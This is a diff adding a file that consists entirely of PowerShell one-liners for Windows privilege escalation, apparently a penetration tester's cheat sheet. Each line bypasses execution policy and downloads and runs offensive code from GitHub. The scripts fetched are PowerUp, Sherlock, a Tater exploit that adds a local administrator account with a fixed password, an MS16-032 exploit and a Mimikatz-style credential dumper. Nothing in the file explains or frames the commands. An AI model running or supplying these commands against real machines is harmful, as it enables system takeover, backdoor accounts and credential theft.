@@ -1,0 +1,9 @@
+powershell -exec bypass "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
+
+powershell -exec bypass "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"
+
+powershell -exec bypass "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command 'net user admin Winter2016 /add && net localgroup administrators admin /add'"
+
+powershell -exec bypass "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1'); Invoke-MS16-032"
+
+powershell -exec bypass "IEX(New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js','katz.js'); cscript .\katz.js" 
